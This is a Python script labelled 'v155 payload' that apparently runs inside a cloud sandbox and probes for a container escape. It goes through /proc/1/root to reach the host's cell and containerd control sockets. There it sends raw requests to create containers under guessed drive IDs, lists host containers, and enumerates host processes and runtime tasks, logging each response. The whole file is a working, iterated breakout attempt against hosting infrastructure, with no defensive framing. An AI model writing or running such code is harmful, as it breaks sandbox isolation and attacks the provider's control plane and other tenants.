# -*- coding: utf-8 -*-
"""v155 payload: Create(drive_id) 响应验证优先 + 输出截断防 JSONL 截断
输出 /vercel/sandbox/v155c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v155c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 2500] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def readp(pid, name, n=6000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


# ============ 1: Create drive_id 验证 (最优先) ============
log('=== 1 Create ===')
for did in ['sandbox', 'sandbox/', '/sandbox', 'Sandbox', 'default', 'hvc_iad1_d0b8cc3b_1216e1cef84c477fbff758ff664ae161']:
    body = json.dumps({'drive_id': did}).encode()
    st, pay = raw_req(CELL, '%s/Create' % CTRS, body, t=6)
    log('Create %r -> %s %r' % (did, st, pay[:500]))
    if '200' in st:
        log('!!! 200 drive_id=%r body=%r' % (did, pay[:800]))

# 也试 image 模式正常创建 (对照)
log('--- image create ---')
body = json.dumps({'image': 'ubuntu:latest'}).encode()
st, pay = raw_req(CELL, '%s/Create' % CTRS, body, t=6)
log('Create image -> %s %r' % (st, pay[:400]))

# 试空 body / 最小 body
for b2 in [b'{}', b'{"drive_id":""}', b'{"drive_id":null}', b'{"container_id":"x"}' ]:
    st, pay = raw_req(CELL, '%s/Create' % CTRS, b2, t=4)
    log('Create %r -> %s %r' % (b2, st, pay[:300]))

# ============ 2: containerd List (看是否生成新容器) ============
log('=== 2 ctr list ===')
try:
    import subprocess
    tmp = '/vercel/sandbox/curl_req.bin'
    open(tmp, 'wb').write(b'\x00\x00\x00\x00\x00')
    hdr = '/vercel/sandbox/curl_hdr.txt'
    csock = R + '/run/containerd/containerd.sock'
    cmd = ['curl', '-sS', '--max-time', '6', '--http2-prior-knowledge',
           '--unix-socket', csock, '-X', 'POST',
           '-H', 'Content-Type: application/grpc', '-H', 'containerd-namespace: default',
           '-D', hdr, '--data-binary', '@%s' % tmp,
           'http://unix/containerd.services.containers.v1.Containers/List']
    r = subprocess.run(cmd, capture_output=True, timeout=8)
    out = r.stdout
    log('CTR List len=%d' % len(out))
    for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
        log('CTR uuid %s' % m.group().decode())
    for m in re.finditer(rb'v1[0-9][0-9][ab]', out):
        log('CTRID %s' % m.group().decode())
    log('CTR raw: %r' % out[:1500])
except Exception as e:
    log('ctr list EXC %s' % e)

# ============ 3: sandboxctrl 存活确认 + config ============
log('=== 3 sc alive ===')
try:
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in ('sandboxctrl', 'containerd', 'celld'):
                log('proc %s comm=%s exe=%s' % (d, comm, os.readlink('/proc/%s/exe' % d)))
    base = R + '/run/containerd/io.containerd.runtime.v2.task/default'
    for cid in sorted(os.listdir(base))[:12]:
        log('task %s' % cid)
except Exception as e:
    log('sc EXC %s' % e)

log('V155_DONE')
f.close()
